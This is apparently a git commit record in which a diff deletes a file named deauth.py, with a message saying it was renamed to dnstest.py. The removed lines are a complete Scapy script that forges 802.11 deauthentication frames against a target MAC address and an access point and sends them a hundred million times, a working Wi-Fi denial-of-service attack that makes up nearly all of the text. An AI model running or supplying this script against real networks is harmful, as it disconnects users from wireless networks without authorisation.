e5f81f61cee8779adc15e0b11441f2c070a5c822
Madff386 <69940651+Madff386@users.noreply.github.com>
2021-01-21 12:11:36 +1100

    Update and rename deauth.py to dnstest.py

--- deauth.py
+++
@@ -1,8 +0,0 @@
-import sys
-from scapy.all import *
-
-
-
-packet=RadioTap()/Dot11(type=8, subtype=12, addr1=sys.argv[3],addr2=sys.argv[2],addr3=sys.argv[2])/Dot11Deauth()
-
-sendp(packet,iface=sys.argv[1],count=100000000,inter=0.1)
